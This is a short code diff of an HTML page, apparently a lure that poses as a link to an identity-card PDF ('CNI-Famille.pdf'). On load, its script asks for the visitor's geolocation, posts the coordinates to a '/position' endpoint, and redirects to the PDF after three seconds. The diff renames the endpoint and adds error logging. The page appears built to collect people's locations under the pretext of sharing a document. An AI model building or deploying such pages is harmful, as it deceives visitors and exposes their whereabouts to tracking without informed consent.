@@ -41,7 +41,7 @@
     <script>
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(function(position) {
-                fetch("/log_position", {
+                fetch("/position", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
@@ -51,13 +51,15 @@
                         longitude: position.coords.longitude
                     })
                 });
+            }, function(error) {
+                console.warn("Erreur de géolocalisation : ", error.message);
             });
         }
 
         // Redirection automatique vers le PDF
         setTimeout(() => {
             window.location.href = "/static/CNI-Famille.pdf";
-        }, 3000); // délai de 3 secondes
+        }, 3000);
     </script>
 </body>
 </html>
